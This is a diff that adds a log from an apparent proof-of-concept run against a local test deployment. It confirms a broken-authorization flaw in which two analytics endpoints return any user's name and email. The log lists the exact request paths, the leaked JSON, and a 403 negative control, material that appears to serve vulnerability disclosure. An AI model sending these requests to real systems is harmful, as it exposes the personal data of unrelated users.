@@ -1,0 +1,20 @@
+========================================================================
+VULN-015: Arbitrary-user PII oracle via analytics (:userId never scoped)
+target: API=http://localhost:21527  dashboard=http://localhost:21526
+========================================================================
+[INFO] org route organization.ts:471 gated by orgTeamMemberMiddleware (ADMIN|TUTOR)
+[INFO] course route people.ts:172 gated by courseTeamMemberMiddleware (course team | org admin)
+[INFO] both call getProfileById(:userId) with NO membership filter -> arbitrary PII
+[SETUP] caller = an org team member (admin); org course it owns
+[SETUP] caller course = 24c1770e-1b00-4f57-a585-8b5730351b0e
+[SETUP] victim = a fresh unrelated account (NOT a member of the caller's org/course)
+[SETUP] victim user=c7310451-ad19-447a-8ae5-0eb5ba2b2830 email=u_0bda229a@cvehunt.local orgRoles={}  (empty => not in the org)
+[STEP] GET /organization/audience/c7310451-ad19-447a-8ae5-0eb5ba2b2830/analytics  (victim is NOT in the org's audience)
+[INFO]   HTTP 200  leaked user = {'id': 'c7310451-ad19-447a-8ae5-0eb5ba2b2830', 'fullName': 'u_0bda229a', 'email': 'u_0bda229a@cvehunt.local', 'avatarUrl': '', 'lastSeen': '2026-09-27T14:49:35.241Z'}
+[STEP] GET /course/24c1770e-1b00-4f57-a585-8b5730351b0e/members/c7310451-ad19-447a-8ae5-0eb5ba2b2830/analytics  (victim is NOT enrolled)
+[INFO]   HTTP 200  leaked user = {'id': 'c7310451-ad19-447a-8ae5-0eb5ba2b2830', 'fullName': 'u_0bda229a', 'email': 'u_0bda229a@cvehunt.local', 'avatarUrl': '', 'lastSeen': '2026-09-27T14:49:35.241Z'}
+[STEP] negative control: a STUDENT session hits the org endpoint (must be 403 — gate is real)
+[INFO]   STUDENT GET /organization/audience/... -> HTTP 403 (403 expected: students are not team members; ADMIN/TUTOR pass)
+[PROOF] both analytics endpoints returned the exact email 'u_0bda229a@cvehunt.local' of an account with empty orgRoles (not in the org) that is not enrolled in the caller's course — the :userId path param is a global PII oracle
+==> VULN-015: CONFIRMED — analytics endpoints resolve any userId to name+email (BOLA)
+[OK] exploit confirmed — arbitrary-user email disclosure via analytics
